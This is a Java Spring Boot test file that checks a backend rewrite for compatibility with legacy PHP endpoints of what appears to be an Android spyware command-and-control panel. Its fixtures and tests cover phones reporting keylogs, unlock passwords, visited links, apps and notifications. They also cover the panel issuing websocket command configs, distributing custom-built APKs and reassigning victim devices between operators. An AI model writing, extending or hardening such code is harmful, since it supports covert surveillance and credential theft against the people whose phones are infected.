package com.mm.backend;

import static org.hamcrest.Matchers.hasSize;
import static org.hamcrest.Matchers.not;
import static org.hamcrest.Matchers.blankOrNullString;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.jsonPath;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.MvcResult;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;

@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("test")
class LegacyApiCompatibilityTests {

    @Autowired
    MockMvc mvc;

    @Autowired
    JdbcTemplate jdbc;

    @Autowired
    ObjectMapper mapper;

    private final BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();

    @BeforeEach
    void resetData() {
        jdbc.update("DELETE FROM custom_app");
        jdbc.update("DELETE FROM phones");
        jdbc.update("DELETE FROM users");

        jdbc.update("""
            INSERT INTO users (userid, usrname, profilepic, email, password, Expire, subtype, token, token_expiration, authorty, hidden)
            VALUES (?, ?, '', ?, ?, '2026-12-31', '12 Month', NULL, NULL, ?, 0)
            """, 1, "admin", "admin@example.test", encoder.encode("admin-pass"), "admin");
        jdbc.update("""
            INSERT INTO users (userid, usrname, profilepic, email, password, Expire, subtype, token, token_expiration, authorty, hidden)
            VALUES (?, ?, '', ?, ?, '2026-12-31', '12 Month', NULL, NULL, ?, 0)
            """, 2, "client", "client@example.test", encoder.encode("client-pass"), "clients");
        jdbc.update("""
            INSERT INTO users (userid, usrname, profilepic, email, password, Expire, subtype, token, token_expiration, authorty, hidden)
            VALUES (?, ?, '', ?, ?, '2026-12-31', '12 Month', NULL, NULL, ?, 0)
            """, 3, "target", "target@example.test", encoder.encode("target-pass"), "clients");

        jdbc.update("""
            INSERT INTO phones (
              phone_id, usrname, phone_name, country, address, android_ver, model, phonepassword,
              phonenumber, wallpaper, battery_charg, network, install_date, last_ping,
              keylogs_dates, visited_links, visited_apps, notifications, activities, phone_options,
              phoneopen, accessibility
            ) VALUES (?, ?, ?, ?, ?, ?, ?, '', '', '', ?, ?, ?, CURRENT_TIMESTAMP,
              '', '', '', '', ?, '', ?, ?)
            """, "phone-open", "client", "Alpha", "CN", "Shanghai", "14", "Pixel 8", "88%", "wifi",
            "2026-05-20", "MainActivity", 1, "1");
        jdbc.update("""
            INSERT INTO phones (
              phone_id, usrname, phone_name, country, address, android_ver, model, phonepassword,
              phonenumber, wallpaper, battery_charg, network, install_date, last_ping,
              keylogs_dates, visited_links, visited_apps, notifications, activities, phone_options,
              phoneopen, accessibility
            ) VALUES (?, ?, ?, ?, ?, ?, ?, '', '', '', ?, ?, ?, CURRENT_TIMESTAMP,
              '', '', '', '', ?, '', ?, ?)
            """, "phone-closed", "client", "Beta", "US", "LA", "13", "Galaxy", "55%", "4g",
            "2026-05-19", "OtherActivity", 0, "0");
        jdbc.update("""
            INSERT INTO phones (
              phone_id, usrname, phone_name, country, address, android_ver, model, phonepassword,
              phonenumber, wallpaper, battery_charg, network, install_date, last_ping,
              keylogs_dates, visited_links, visited_apps, notifications, activities, phone_options,
              phoneopen, accessibility
            ) VALUES (?, ?, ?, ?, ?, ?, ?, '', '', '', ?, ?, ?, CURRENT_TIMESTAMP,
              '', '', '', '', ?, '', ?, ?)
            """, "phone-admin", "admin", "Gamma", "JP", "Tokyo", "12", "Xperia", "61%", "wifi",
            "2026-05-18", "AdminActivity", 1, "1");

        jdbc.update("""
            INSERT INTO custom_app (build_id, user_id, app_package, app_path, appname, app_ico, build_date, build_state)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            """, 10, 1, "org.example.demo", "/user/apps/1/org.example.demo/org.example.demo.apk",
            "Demo", "", "2026-05-24", "finished");
    }

    @Test
    void loginReturnsLegacyShapeAndStoresUsableToken() throws Exception {
        String token = login("client", "client-pass");

        mvc.perform(post("/api/settings.php")
                .contentType(MediaType.APPLICATION_JSON)
                .header("Authorization", "Bearer " + token)
                .content("{\"subcom\":\"info\"}"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.code").value(200))
            .andExpect(jsonPath("$.data.username").value("client"))
            .andExpect(jsonPath("$.data.role").value("clients"));
    }

    @Test
    void loginMatchesPasswordWhenUsernameIsSharedAcrossRoles() throws Exception {
        jdbc.update("""
            INSERT INTO users (userid, usrname, profilepic, email, password, Expire, subtype, token, token_expiration, authorty, hidden)
            VALUES (?, ?, '', ?, ?, '2026-12-31', '12 Month', NULL, NULL, ?, 0)
            """, 4, "shared", "shared-admin@example.test", encoder.encode("admin-secret"), "admin");
        jdbc.update("""
            INSERT INTO users (userid, usrname, profilepic, email, password, Expire, subtype, token, token_expiration, authorty, hidden)
            VALUES (?, ?, '', ?, ?, '2026-12-31', '12 Month', NULL, NULL, ?, 0)
            """, 5, "shared", "shared-client@example.test", encoder.encode("client-secret"), "clients");

        mvc.perform(post("/api/auth.php")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"usrname\":\"shared\",\"password\":\"client-secret\"}"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.email").value("shared-client@example.test"))
            .andExpect(jsonPath("$.authorty").value("clients"));

        mvc.perform(post("/api/auth.php")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"usrname\":\"shared\",\"password\":\"admin-secret\"}"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.email").value("shared-admin@example.test"))
            .andExpect(jsonPath("$.authorty").value("admin"));
    }

    @Test
    void devicesEndpointKeepsLegacyPaginationAndOwnerRules() throws Exception {
        String clientToken = login("client", "client-pass");
        mvc.perform(post("/api/devices.php")
                .contentType(MediaType.APPLICATION_JSON)
                .header("X-Auth-Token", clientToken)
                .content("{\"page\":1,\"pageSize\":20}"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.total").value(1))
            .andExpect(jsonPath("$.data", hasSize(1)))
            .andExpect(jsonPath("$.data[0].phone_id").value("phone-open"));

        String adminToken = login("admin", "admin-pass");
        mvc.perform(post("/api/devices.php")
                .contentType(MediaType.APPLICATION_JSON)
                .header("X-Auth-Token", adminToken)
                .content("{\"page\":1,\"pageSize\":20,\"country\":\"C\"}"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.total").value(1))
            .andExpect(jsonPath("$.data[0].country").value("CN"));
    }

    @Test
    void deviceDetailAndMutationsKeepLegacyResponseShapes() throws Exception {
        String token = login("client", "client-pass");

        mvc.perform(post("/api/detail.php")
                .contentType(MediaType.APPLICATION_JSON)
                .header("X-Auth-Token", token)
                .content("{\"phone_id\":\"phone-open\"}"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.status").value("success"))
            .andExpect(jsonPath("$.device.phone_id").value("phone-open"))
            .andExpect(jsonPath("$.device.phonename").value("Alpha"))
            .andExpect(jsonPath("$.device.phonemodel").value("Pixel 8"));

        mvc.perform(post("/api/update_remark.php")
                .contentType(MediaType.APPLICATION_JSON)
                .header("X-Auth-Token", token)
                .content("{\"phone_id\":\"phone-open\",\"clientname\":\"New Name\"}"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.message").value("备注修改成功"));

        mvc.perform(post("/api/toggle.php")
                .contentType(MediaType.APPLICATION_JSON)
                .header("X-Auth-Token", token)
                .content("{\"phone_id\":\"phone-open\",\"phoneopen\":0}"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.message").value("Device status updated successfully"));

        mvc.perform(post("/api/assign.php")
                .contentType(MediaType.APPLICATION_JSON)
                .header("X-Auth-Token", token)
                .content("{\"phone_id\":\"phone-open\",\"usrname\":\"target\"}"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.status").value("success"))
            .andExpect(jsonPath("$.email").value("target@example.test"));

        mvc.perform(post("/api/remove.php")
                .contentType(MediaType.APPLICATION_JSON)
                .header("X-Auth-Token", login("target", "target-pass"))
                .content("{\"phone_id\":\"phone-open\"}"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.status").value("success"));
    }

    @Test
    void passwordChangeUsesLegacySettingsEndpoint() throws Exception {
        String token = login("client", "client-pass");

        mvc.perform(post("/api/settings.php")
                .contentType(MediaType.APPLICATION_JSON)
                .header("X-Auth-Token", token)
                .content("{\"subcom\":\"changepwd\",\"old_password\":\"client-pass\",\"new_password\":\"changed-pass\"}"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.code").value(200));

        mvc.perform(post("/api/auth.php")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"usrname\":\"client\",\"password\":\"changed-pass\"}"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.token", not(blankOrNullString())));
    }

    @Test
    void deviceIngressEndpointsKeepLegacyFormContract() throws Exception {
        mvc.perform(post("/api/Ping.php")
                .header("X-Device-Key", "test-device-key")
                .param("user_email", "client@example.test")
                .param("phone_id", "device-from-ping")
                .param("phone_name", "Phone Ping")
                .param("android_version", "14")
                .param("model", "Pixel")
                .param("phone_password", "1234")
                .param("phone_number", "10086")
                .param("battery_charge", "92%")
                .param("network", "wifi")
                .param("install_date", "2026-05-24")
                .param("idf", "session-1")
                .param("keylogs", "keys")
                .param("vLinks", "links")
                .param("vapps", "apps")
                .param("notifys", "notifications")
                .param("activz", "activity")
                .param("isonline", "1")
                .param("accessibility", "1"))
            .andExpect(status().isOk())
            .andExpect(content().string("Conf:{\"sk\":\"wss://example.test/api/ws/\"}"));

        Integer count = jdbc.queryForObject("SELECT COUNT(*) FROM phones WHERE phone_id = ? AND usrname = ?",
            Integer.class, "device-from-ping", "client");
        org.assertj.core.api.Assertions.assertThat(count).isEqualTo(1);

        mvc.perform(post("/api/sync.php")
                .header("X-Device-Key", "test-device-key")
                .param("user_email", "client@example.test")
                .param("phone_id", "device-from-ping")
                .param("phone_name", "Phone Sync")
                .param("android_version", "15")
                .param("model", "Pixel")
                .param("battery_charge", "90%")
                .param("network", "5g")
                .param("install_date", "2026-05-24"))
            .andExpect(status().isOk())
            .andExpect(content().string("Conf:{\"sk\":\"wss://example.test/api/ws/\"}"));
    }

    @Test
    void reportEndpointStoresSanitizedDeviceLogs() throws Exception {
        mvc.perform(post("/api/report.php")
                .header("X-Error-Key", "test-error-key")
                .param("devicename", "device../bad")
                .param("log", "line1\r\nline2"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.success").value(true));

        mvc.perform(post("/api/Error.php")
                .header("X-Error-Key", "test-error-key")
                .param("devicename", "device-a")
                .param("log", "error"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.success").value(true));
    }

    @Test
    void publicAppLookupEndpointsKeepLegacyResponses() throws Exception {
        mvc.perform(get("/api/share.php").param("pkg", "org.example.demo"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.url").value("/user/apps/1/org.example.demo/org.example.demo.apk"));

        mvc.perform(get("/api/share.php").param("pkg", "../bad"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.error").value("invalid"));

        mvc.perform(get("/api/download.php").param("pkg", "org.example.demo"))
            .andExpect(status().is3xxRedirection())
            .andExpect(header().string("Location", "/user/apps/1/org.example.demo/org.example.demo.apk"));
    }

    @Test
    void internalReassignRequiresLocalTokenAndUpdatesOwner() throws Exception {
        mvc.perform(post("/api/internal_reassign.php")
                .contentType(MediaType.APPLICATION_JSON)
                .content("""
                    {"internal_key":"test-internal-key","phone_id":"phone-open","usrname":"target"}
                    """))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.status").value("success"))
            .andExpect(jsonPath("$.usrname").value("target"))
            .andExpect(jsonPath("$.real_email").value("target@example.test"));

        String owner = jdbc.queryForObject("SELECT usrname FROM phones WHERE phone_id = ?", String.class, "phone-open");
        org.assertj.core.api.Assertions.assertThat(owner).isEqualTo("target");
    }

    @Test
    void websocketInternalReassignKeepsNewEmailContract() throws Exception {
        mvc.perform(post("/api/ws/internal_reassign.php")
                .contentType(MediaType.APPLICATION_JSON)
                .content("""
                    {"internal_key":"test-internal-key","phone_id":"phone-open","new_email":"target@example.test"}
                    """))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.status").value("success"))
            .andExpect(jsonPath("$.usrname").value("target"));

        String owner = jdbc.queryForObject("SELECT usrname FROM phones WHERE phone_id = ?", String.class, "phone-open");
        org.assertj.core.api.Assertions.assertThat(owner).isEqualTo("target");
    }

    @Test
    void internalReassignRejectsDeviceTokenAndEmptyKey() throws Exception {
        // Device-side token must not unlock the internal endpoint.
        mvc.perform(post("/api/internal_reassign.php")
                .contentType(MediaType.APPLICATION_JSON)
                .content("""
                    {"internal_key":"test-ws-device-key","phone_id":"phone-open","usrname":"target"}
                    """))
            .andExpect(status().isUnauthorized());

        // Empty internal_key must be rejected even though the configured token is non-empty.
        mvc.perform(post("/api/internal_reassign.php")
                .contentType(MediaType.APPLICATION_JSON)
                .content("""
                    {"internal_key":"","phone_id":"phone-open","usrname":"target"}
                    """))
            .andExpect(status().isUnauthorized());

        String owner = jdbc.queryForObject("SELECT usrname FROM phones WHERE phone_id = ?", String.class, "phone-open");
        org.assertj.core.api.Assertions.assertThat(owner).isEqualTo("client");
    }

    @Test
    void internalReassignRejectsForwardedNonLoopback() throws Exception {
        // A reverse proxy on 127.0.0.1 must not be able to launder a public IP into
        // a "trusted internal" request just by forwarding the call.
        mvc.perform(post("/api/internal_reassign.php")
                .with(request -> { request.setRemoteAddr("203.0.113.7"); return request; })
                .contentType(MediaType.APPLICATION_JSON)
                .content("""
                    {"internal_key":"test-internal-key","phone_id":"phone-open","usrname":"target"}
                    """))
            .andExpect(status().isForbidden());

        String owner = jdbc.queryForObject("SELECT usrname FROM phones WHERE phone_id = ?", String.class, "phone-open");
        org.assertj.core.api.Assertions.assertThat(owner).isEqualTo("client");
    }

    @Test
    void assignRequiresPhoneIdToPreventEmailEnumeration() throws Exception {
        String token = login("client", "client-pass");

        mvc.perform(post("/api/assign.php")
                .contentType(MediaType.APPLICATION_JSON)
                .header("X-Auth-Token", token)
                .content("{\"usrname\":\"admin\"}"))
            .andExpect(status().isBadRequest())
            .andExpect(jsonPath("$.message").value("phone_id is required"));
    }

    private String login(String username, String password) throws Exception {
        MvcResult result = mvc.perform(post("/api/auth.php")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"usrname\":\"" + username + "\",\"password\":\"" + password + "\"}"))
            .andExpect(status().isOk())
            .andExpect(jsonPath("$.code").value(200))
            .andExpect(jsonPath("$.token", not(blankOrNullString())))
            .andReturn();
        JsonNode root = mapper.readTree(result.getResponse().getContentAsString());
        return root.path("token").asText();
    }
}
